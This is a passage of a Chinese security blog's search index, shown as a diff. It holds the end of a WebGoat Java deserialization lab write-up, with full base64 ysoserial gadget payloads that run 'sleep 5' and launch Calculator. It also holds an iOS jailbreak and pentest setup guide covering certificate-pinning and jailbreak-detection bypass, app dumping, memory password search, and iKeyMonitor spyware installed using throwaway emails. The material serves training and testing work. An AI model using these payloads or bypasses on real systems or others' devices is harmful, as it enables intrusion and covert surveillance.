VybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAHc2xlZXAgNQgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQARamF2YS9sYW5nL1Byb2Nlc3MHADYBAAd3YWl0Rm9yAQADKClJDAA4ADkKADcAOgEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXIxMzkwODU2MDU4NzM2MTYBACBMeXNvc2VyaWFsL1B3bmVyMTM5MDg1NjA1ODczNjE2OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关键就两点：</p>
+<ol>
+<li>识别反序列化流量</li>
+<li>找到相应可利用执行命令的组件</li>
+</ol>
+<p>有时候需要特别修改ysoserial的内容来配合执行命令。</p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>可在<code>/WebGoat-develop/webgoat-container/src/main/resources/application.properties:6</code> 修改端口等信息</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/application-properties.png" alt="application-properties"></p>
+<p>更改反序列化payload为弹计算器，反序列化payload如下：</p>
+<p>（Mac下计算器路径是<code>/Applications/Calculator.app/Contents/MacOS/Calculator</code>）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABwDK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQA2L0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBABFqYXZhL2xhbmcvUHJvY2VzcwcANgEAB3dhaXRGb3IBAAMoKUkMADgAOQoANwA6AQANU3RhY2tNYXBUYWJsZQEAHXlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0AQAfTHlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>
+
+<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/engine/spi/TypedValue.class</code></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/TypeValue.png" alt="TypeValue"></p>
+<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/property/access/spi/GetterMethodImpl.class</code></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/GetterMethodImpl.png" alt="GetterMethodImpl"></p>
+<p><code>/Applications/IntelliJ IDEA.app/Contents/jbr/Contents/Home!/java.xml/jdk/xml/internal/JdkXmlFeatures.class</code></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/JdkXmlFeatures.png" alt="JdkXmlFeatures"></p>
+<h2 id="Java报错"><a href="#Java报错" class="headerlink" title="Java报错"></a>Java报错</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error:java: error: release version 5 not supported</span><br></pre></td></tr></table></figure>
+
+<p>在maven中添加</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
+  </entry>
+  <entry>
+    <title>iOS 12.4越狱+配置过程记录</title>
+    <url>/2020/03/31/iOS-jailbreak/</url>
+    <content><![CDATA[<h1 id="越狱"><a href="#越狱" class="headerlink" title="越狱"></a>越狱</h1><p>在 <a href="https://checkra.in/#release" target="_blank" rel="noopener">https://checkra.in/#release</a> 中下载，其中能越狱的设备有iPhone 5s – iPhone X, iOS 12.3 and up</p>
+<p>我的设备是iPhone SE(A9)，iOS版本12.4</p>
+<a id="more"></a>
+
+<img src="/2020/03/31/iOS-jailbreak/checkra1n-latest-release.png" alt="checkra1n-latest-release" style="zoom: 67%;">
+
+<p>下载完成后，将手机通过数据线连接Mac，运行checkra1n，点击start</p>
+<img src="/2020/03/31/iOS-jailbreak/run-checkra1n.png" alt="run-checkra1n" style="zoom:43%;">
+
+<p>一直点击next，直到如下画面，根据以下提示按键</p>
+<ol>
+<li>点击Start</li>
+<li>同时按住关机键和home键</li>
+<li>松开关机键，持续按住home键</li>
+</ol>
+<img src="/2020/03/31/iOS-jailbreak/checkra1n-start-jailbreak.png" alt="checkra1n-start-jailbreak" style="zoom: 43%;">
+
+<p>之后等待一会，程序安装完成之后，iPhone会重启。</p>
+<p>重启完成后输入密码，进行系统，点开checkra1n应用，安装Cydia。</p>
+<p>（安装Cydia最好翻墙，翻墙很快下完，不翻墙下载失败）</p>
+<img src="/2020/03/31/iOS-jailbreak/checkra1n-jailbreak-success.png" alt="checkra1n-jailbreak-success" style="zoom:33%;">
+
+<p>整个越狱流程就结束了，非常简单快捷。</p>
+<h1 id="iProxy"><a href="#iProxy" class="headerlink" title="iProxy"></a>iProxy</h1><p>安装完Cydia之后可以来安装iProxy。iProxy的用处是通过USB进行SSH连接手机，虽然Wi-Fi就能通过SSH连接，但是稳定性和传输速度比不上USB。</p>
+<p>在Mac上执行：<code>brew install libusbmuxd</code>，安装完成之后将手机的端口映射到其他端口上：<code>iproxy 2222 22</code>,在令一个终端页面输入<code>ssh root@localhost -p 2222</code>开始连接，密码是alpine。</p>
+<p>⚠️ 我连接SSH时出现问题，报错内容如下</p>
+<img src="/2020/03/31/iOS-jailbreak/iproxy-error.png" alt="iproxy-error" style="zoom:50%;">
+
+<p>我的解决办法就是重新安装openssh，重装后就能正常连接</p>
+<img src="/2020/03/31/iOS-jailbreak/iproxy-success.png" alt="iproxy-success" style="zoom:50%;">
+
+
+
+<h1 id="Frida-and-Objection"><a href="#Frida-and-Objection" class="headerlink" title="Frida and Objection"></a>Frida and Objection</h1><p>Frida安装教程：<a href="https://frida.re/docs/ios/" target="_blank" rel="noopener">https://frida.re/docs/ios/</a></p>
+<p>在Mac执行：<code>pip3 install frida-tools</code></p>
+<p>需要在iPhone上执行的操作：打开Cydia -&gt; 点击底部栏“软件源” -&gt; 点击右上角“编辑” -&gt; 点击左上角“添加”，然后输入 <a href="https://build.frida.re" target="_blank" rel="noopener">https://build.frida.re</a></p>
+<p>完成之后，点击新增的源找到“build.frida.re”点击进去，里面有三个可选项，分别是“Frida for 32-bit devices”、“Frida for A12+ devices”、“Frida for pre-A12 devices”，32-bit是iPhone 5s和iPad Air（不含）以下的设备，A12+是iPhone X（不含）以上的设备。</p>
+<p>因为我的设备是iPhone SE，芯片型号是A9，所以选择“Frida for pre-A12 devices”</p>
+<p>安装完Firda之后，继续安装Objection。</p>
+<p>在Mac上执行<code>pip3 install objection</code>，安装完成之后可以运行<code>objection --gadget &quot;com.apple.AppStore&quot; explore</code>来测试一下</p>
+<img src="/2020/03/31/iOS-jailbreak/objection-install.png" alt="objection-install" style="zoom:50%;">
+
+
+
+<p>⚠️ 如果安装的是“Frida for A12+ devices”，使用Frida时需要开启Xcode来挂载硬盘镜像。</p>
+<img src="/2020/03/31/iOS-jailbreak/objection-error.png" alt="objection-error" style="zoom:50%;">
+
+
+
+<h1 id="证书配置和安装SSL-Kill-Switch-2"><a href="#证书配置和安装SSL-Kill-Switch-2" class="headerlink" title="证书配置和安装SSL Kill Switch 2"></a>证书配置和安装SSL Kill Switch 2</h1><p>证书配置非常简单，设置好burp代理，访问 <a href="http://burp" target="_blank" rel="noopener">http://burp</a> ，安装证书。</p>
+<p>安装证书之后在 设置 -&gt; 通用 -&gt; 描述文件 -&gt; PortSwigger CA，点击安装。</p>
+<p>再到 通用 -&gt; 关于本机 -&gt; 证书信任设置，选上PortSwigger即可。</p>
+<img src="/2020/03/31/iOS-jailbreak/certificate-trust.png" alt="certificate-trust" style="zoom:33%;">
+
+
+
+<p>重点是安装SSL Killing，app测试时很多应用都会强制使用certificate pinning导致无法抓包，安装<a href="https://github.com/nabla-c0d3/ssl-kill-switch2" target="_blank" rel="noopener">SSL Kill Switch 2</a>可帮助我们绕过certificate pinning。</p>
+<ol>
+<li>安装前先确定Cydia中安装了以下packages：<code>wget</code>、<code>Debian Packager</code>、<code>Cydia Substrate</code>、<code>PreferenceLoader</code></li>
+</ol>
+<p>⚠️ 找不到PreferenceLoader，可添加源：<a href="https://rpetri.ch/repo" target="_blank" rel="noopener">https://rpetri.ch/repo</a> ，再安装。</p>
+<ol start="2">
+<li>在<a href="https://github.com/nabla-c0d3/ssl-kill-switch2/releases" target="_blank" rel="noopener">SSL Kill Switch 2 release</a>中复制最新的<code>.deb</code>链接</li>
+<li>使用SSH连接iPhone，运行<code>wget &lt;RELEASE URL FROM STEP 2&gt;</code> -&gt; <code>dpkg -i &lt;DOWNLOAD PACKAGE NAME&gt;</code> -&gt;killall -HUP SpringBoard，确定安装成功后<code>rm &lt;DOWNLOAD PACKAGE NAME&gt;</code></li>
+<li>打开iPhone，在设置 -&gt; SSL Kill Switch 2（设置的最下方） -&gt; 勾选Disable Certificate Validation</li>
+</ol>
+<img src="/2020/03/31/iOS-jailbreak/SSL-Kill-Switch.png" alt="SSL-Kill-Switch" style="zoom:33%;">
+
+
+
+<h1 id="绕过越狱检测"><a href="#绕过越狱检测" class="headerlink" title="绕过越狱检测"></a>绕过越狱检测</h1><h3 id="Liberty"><a href="#Liberty" class="headerlink" title="Liberty"></a>Liberty</h3><p>iPhone上打开Cydia，添加源<code>https://ryleyangus.com/repo/</code>，之后搜索<code>Liberty Lite</code>，安装即可。</p>
+<p>安装完成之后在设置中开启Liberty，再点击Block Jailbreak Detection中选择需要绕过越狱检测的iOS应用。</p>
+<img src="/2020/03/31/iOS-jailbreak/liberty.png" alt="liberty" style="zoom:33%;">
+
+<p>如果在某些APP中不生效，也可以尝试其他插件，比如xCon。</p>
+<h3 id="xCon"><a href="#xCon" class="headerlink" title="xCon"></a>xCon</h3><p>在Cydia中添加源 <a href="http://xcon.crazy.net/" target="_blank" rel="noopener">http://xcon.crazy.net</a> ，进入添加的源中选择xCon下载安装即可。</p>
+<p>xCon会绕过以下越狱检测方法（1）根据是否存在特定的越狱文件，及特定文件的权限是否发生变化来判断设备是否越狱（2）根据沙箱完整性检测设备是否越狱（3）根据文件系统的分区是否发生变化来检测设备是否越狱（4）根据是否安装ssh来判断设备是否越狱</p>
+<h1 id="导出APP文件"><a href="#导出APP文件" class="headerlink" title="导出APP文件"></a>导出APP文件</h1><p>导出APP是一个非常有用的功能，导出之后的文件没有壳，拖到IDA中直接反编译就行，非常方便，谁用谁知道。</p>
+<ol>
+<li>在Mac中输入<code>git clone https://github.com/AloneMonkey/frida-ios-dump.git &amp;&amp; cd frida-ios-dump</code></li>
+<li><code>sudo pip3 install -r requirements.txt --upgrade</code></li>
+<li>在另一个终端输入<code>iproxy 2222 22</code></li>
+<li><code>python3 dump.py -l</code>列举iPhone上所有的应用，<code>python3 ./dump.py &lt;APP DISPLAY NAME OR BUNDLE IDENTIFIER&gt;</code>导出APP文件。</li>
+</ol>
+<h1 id="安装Apple-File-Conduit-2"><a href="#安装Apple-File-Conduit-2" class="headerlink" title="安装Apple File Conduit 2"></a>安装Apple File Conduit 2</h1><p>iOS9以上无法通过第三方软件读取应用文件，安装Apple File Confuit2可绕过该限制。</p>
+<p>在Cydia中搜索“Apple File Confuit2”即可</p>
+<p>APP文件目录：    </p>
+<p>a) iOS7及之前：/Device/private/var/mobile/Application/UUID/XXXXX.app/</p>
+<p>b) iOS8：/var/mobile/Containers/Bundle/Application/UUID/</p>
+<p>c) iOS9/10/12：/var/containers/Bundle/Application/UUID/</p>
+<h1 id="添加mem-check"><a href="#添加mem-check" class="headerlink" title="添加mem-check"></a>添加mem-check</h1><p>已经安装好OpenSSH，可以使用sftp将mem-check文件上传到iPhone中。</p>
+<p>在本机输入<code>sftp -P 2222 root@localhost</code>，再输入密码<code>alpine</code>进入sftp模式</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ sftp -P 2222 root@localhost</span><br><span class="line">root@localhost<span class="string">'s password: alpine</span></span><br><span class="line"><span class="string">Connected to localhost.</span></span><br></pre></td></tr></table></figure>
+
+<p>进入sftp模式后，使用put将文件上传至iPhone中，上传文件路径为本机的路径</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sftp&gt; put /Tmp/mem-check</span><br><span class="line">Uploading /Tmp/mem-check to /private/var/root/mem-check</span><br><span class="line">/Tmp/mem-check                                       100%  132KB   8.2MB/s   00:00</span><br><span class="line">sftp&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后给mem-check加上执行权限，</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x mem-check</span><br></pre></td></tr></table></figure>
+
+<p>先用ps命令得到APP的PID，再利用mem-check –p PID –s STRING对APP内存进行搜索</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ root<span class="comment"># ps A | grep XXX</span></span><br><span class="line">~ root<span class="comment"># mem-check -p 1234 -s password</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="iKeyMonitor安装"><a href="#iKeyMonitor安装" class="headerlink" title="iKeyMonitor安装"></a>iKeyMonitor安装</h1><p>iKeyMonitor安装直接在Cydia中搜索iKeyMonitor即可</p>
+<p>iKeymonitor只有三天试用时间，使用十分钟邮箱（<a href="http://mail.bccto.me/" target="_blank" rel="noopener">http://mail.bccto.me/</a> ）获取一个随机的邮箱，然后在官网进行注册（ <a href="https://ikeymonitor.com/" target="_blank" rel="noopener">https://ikeymonitor.com/</a> ）</p>
+<p>官网选择sign up -&gt; iPhone/iPad -&gt; The iPhone/iPad can be Jailbroken, and I can get it in my hand and jailbreak it -&gt; 填写User ID 和 Email</p>
+<p>然后会收到一封邮件，点击查看可得到许可证号，使用许可证登录即可</p>
+<p><img src="/2020/03/31/iOS-jailbreak/iKeyMonitor.png" alt="iKeyMonitor"></p>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://spaceraccoon.dev/from-checkra1n-to-frida-ios-app-pentesting-quickstart-on-ios-13" target="_blank" rel="noopener">https://spaceraccoon.dev/from-checkra1n-to-frida-ios-app-pentesting-quickstart-on-ios-13</a></p>
+<p><a href="https://frida.re/docs/ios/" target="_blank" rel="noopener">https://frida.re/docs/ios/</a></p>
+<p><a href="https://github.com/sensepost/objection/wiki/Screenshots" target="_blank" rel="noopener">https://github.com/sensepost/objection/wiki/Screenshots</a></p>
 ]]></content>
   </entry>
 </search>
